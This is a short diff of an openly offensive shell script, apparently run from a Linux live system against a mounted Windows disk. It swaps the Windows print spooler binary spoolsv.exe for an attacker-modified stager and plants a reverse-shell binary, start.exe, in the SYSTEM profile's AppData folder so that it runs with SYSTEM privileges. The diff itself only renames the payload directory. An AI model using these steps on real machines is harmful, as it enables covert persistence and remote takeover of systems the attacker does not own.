@@ -13,12 +13,12 @@ mv /mnt/Windows/System32/spoolsv.exe /mnt/Windows/System32/spoolsv.exe.bak
 #
 # Attacker hacked version of spoolsv.exe is copied over, which will hijack 
 # the service execution.
-cp /home/tc/payload/spoolsv.exe /mnt/Windows/System32/spoolsv.exe
+cp /home/tc/payloads/spoolsv.exe /mnt/Windows/System32/spoolsv.exe
 #
 # Hacked spoolsv.exe is a stager which will attampt to execute 
 # %appdata%\start.exe of the SYSTEM profile. 
 # This is the reverse shell binary.
-cp /home/tc/payload/start.exe /mnt/Windows/System32/config/systemprofile/AppData/Roaming/start.exe
+cp /home/tc/payloads/start.exe /mnt/Windows/System32/config/systemprofile/AppData/Roaming/start.exe
 
 
 
